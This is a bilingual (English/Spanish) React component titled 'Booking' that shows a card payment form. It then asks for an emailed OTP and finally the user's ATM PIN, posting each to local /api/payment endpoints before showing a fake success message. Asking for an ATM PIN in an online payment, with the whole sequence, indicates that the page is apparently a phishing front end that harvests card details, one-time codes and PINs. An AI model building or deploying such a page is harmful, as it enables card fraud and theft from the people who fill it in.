import { useState } from 'react';
import { useLocation } from 'wouter';
import Header from '@/components/Header';

export default function Booking() {
  const [location, setLocation] = useLocation();
  const [language, setLanguage] = useState<'en' | 'es'>('en');
  const [step, setStep] = useState<'booking' | 'payment' | 'otp' | 'pin' | 'success'>('payment');
  const [formData, setFormData] = useState({
    cardNumber: '',
    cardHolder: '',
    expiryDate: '',
    cvv: '',
    email: '',
  });
  const [otp, setOtp] = useState('');
  const [pin, setPin] = useState('');
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');

  const translations = {
    en: {
      cardDetails: 'Card Details',
      cardNumber: 'Card Number',
      cardHolder: 'Card Holder Name',
      expiryDate: 'Expiry Date (MM/YY)',
      cvv: 'CVV',
      email: 'Email Address',
      submit: 'Submit Payment',
      processing: 'Processing...',
      otp: 'Enter OTP',
      enterOtp: 'Enter the OTP sent to your email',
      verifyOtp: 'Verify OTP',
      pin: 'Enter ATM PIN',
      enterPin: 'Enter your ATM PIN',
      verifyPin: 'Verify PIN',
      success: 'Payment Successful!',
      error: 'Error',
      back: 'Back',
    },
    es: {
      cardDetails: 'Detalles de la Tarjeta',
      cardNumber: 'Número de Tarjeta',
      cardHolder: 'Nombre del Titular',
      expiryDate: 'Fecha de Vencimiento (MM/YY)',
      cvv: 'CVV',
      email: 'Correo Electrónico',
      submit: 'Enviar Pago',
      processing: 'Procesando...',
      otp: 'Ingrese OTP',
      enterOtp: 'Ingrese el OTP enviado a su correo',
      verifyOtp: 'Verificar OTP',
      pin: 'Ingrese PIN ATM',
      enterPin: 'Ingrese su PIN ATM',
      verifyPin: 'Verificar PIN',
      success: 'Pago Exitoso!',
      error: 'Error',
      back: 'Atrás',
    },
  };

  const t = translations[language];

  const handleCardSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');

    try {
      const response = await fetch('/api/payment/submit-card', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });

      if (response.ok) {
        setStep('otp');
      } else {
        setMessage(language === 'en' ? 'Error submitting card details' : 'Error al enviar detalles de la tarjeta');
      }
    } catch (error) {
      setMessage(language === 'en' ? 'Network error' : 'Error de red');
    } finally {
      setLoading(false);
    }
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');

    try {
      const response = await fetch('/api/payment/verify-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ otp, email: formData.email }),
      });

      if (response.ok) {
        setStep('pin');
      } else {
        setMessage(language === 'en' ? 'Invalid OTP' : 'OTP inválido');
      }
    } catch (error) {
      setMessage(language === 'en' ? 'Network error' : 'Error de red');
    } finally {
      setLoading(false);
    }
  };

  const handlePinSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');

    try {
      const response = await fetch('/api/payment/verify-pin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ pin, email: formData.email }),
      });

      if (response.ok) {
        setStep('success');
      } else {
        setMessage(language === 'en' ? 'Invalid PIN' : 'PIN inválido');
      }
    } catch (error) {
      setMessage(language === 'en' ? 'Network error' : 'Error de red');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50">
      <Header language={language} onLanguageChange={setLanguage} />

      <main className="flex-1 py-12">
        <div className="max-w-2xl mx-auto px-4">
          {/* Card Details Form */}
          {step === 'payment' && (
            <div className="bg-white rounded-lg shadow-lg p-8">
              <h2 className="text-3xl font-bold mb-8 text-gray-800">{t.cardDetails}</h2>

              <form onSubmit={handleCardSubmit} className="space-y-6">
                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    {t.cardNumber}
                  </label>
                  <input
                    type="text"
                    placeholder="1234 5678 9012 3456"
                    value={formData.cardNumber}
                    onChange={(e) =>
                      setFormData({ ...formData, cardNumber: e.target.value })
                    }
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600"
                    required
                  />
                </div>

                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    {t.cardHolder}
                  </label>
                  <input
                    type="text"
                    placeholder="John Doe"
                    value={formData.cardHolder}
                    onChange={(e) =>
                      setFormData({ ...formData, cardHolder: e.target.value })
                    }
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600"
                    required
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-2">
                      {t.expiryDate}
                    </label>
                    <input
                      type="text"
                      placeholder="12/25"
                      value={formData.expiryDate}
                      onChange={(e) =>
                        setFormData({ ...formData, expiryDate: e.target.value })
                      }
                      className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600"
                      required
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-2">
                      {t.cvv}
                    </label>
                    <input
                      type="text"
                      placeholder="123"
                      value={formData.cvv}
                      onChange={(e) =>
                        setFormData({ ...formData, cvv: e.target.value })
                      }
                      className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600"
                      required
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    {t.email}
                  </label>
                  <input
                    type="email"
                    placeholder="john@example.com"
                    value={formData.email}
                    onChange={(e) =>
                      setFormData({ ...formData, email: e.target.value })
                    }
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600"
                    required
                  />
                </div>

                {message && (
                  <div className="p-4 bg-red-100 text-red-700 rounded-lg">
                    {message}
                  </div>
                )}

                <button
                  type="submit"
                  disabled={loading}
                  className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-lg transition disabled:opacity-50"
                >
                  {loading ? t.processing : t.submit}
                </button>
              </form>
            </div>
          )}

          {/* OTP Form */}
          {step === 'otp' && (
            <div className="bg-white rounded-lg shadow-lg p-8">
              <h2 className="text-3xl font-bold mb-4 text-gray-800">{t.otp}</h2>
              <p className="text-gray-600 mb-8">{t.enterOtp}</p>

              <form onSubmit={handleOtpSubmit} className="space-y-6">
                <div>
                  <input
                    type="text"
                    placeholder="000000"
                    value={otp}
                    onChange={(e) => setOtp(e.target.value)}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg text-center text-2xl tracking-widest focus:outline-none focus:ring-2 focus:ring-red-600"
                    required
                  />
                </div>

                {message && (
                  <div className="p-4 bg-red-100 text-red-700 rounded-lg">
                    {message}
                  </div>
                )}

                <button
                  type="submit"
                  disabled={loading}
                  className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-lg transition disabled:opacity-50"
                >
                  {loading ? t.processing : t.verifyOtp}
                </button>
              </form>
            </div>
          )}

          {/* PIN Form */}
          {step === 'pin' && (
            <div className="bg-white rounded-lg shadow-lg p-8">
              <h2 className="text-3xl font-bold mb-4 text-gray-800">{t.pin}</h2>
              <p className="text-gray-600 mb-8">{t.enterPin}</p>

              <form onSubmit={handlePinSubmit} className="space-y-6">
                <div>
                  <input
                    type="password"
                    placeholder="••••"
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg text-center text-2xl tracking-widest focus:outline-none focus:ring-2 focus:ring-red-600"
                    required
                  />
                </div>

                {message && (
                  <div className="p-4 bg-red-100 text-red-700 rounded-lg">
                    {message}
                  </div>
                )}

                <button
                  type="submit"
                  disabled={loading}
                  className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-lg transition disabled:opacity-50"
                >
                  {loading ? t.processing : t.verifyPin}
                </button>
              </form>
            </div>
          )}

          {/* Success Message */}
          {step === 'success' && (
            <div className="bg-white rounded-lg shadow-lg p-8 text-center">
              <div className="text-6xl mb-4">✓</div>
              <h2 className="text-3xl font-bold mb-4 text-green-600">{t.success}</h2>
              <p className="text-gray-600 mb-8">
                {language === 'en'
                  ? 'Your payment has been processed successfully. You will receive a confirmation email shortly.'
                  : 'Su pago ha sido procesado exitosamente. Recibirá un correo de confirmación pronto.'}
              </p>
              <a
                href="/"
                className="inline-block bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-8 rounded-lg transition"
              >
                {language === 'en' ? 'Back to Home' : 'Volver al Inicio'}
              </a>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
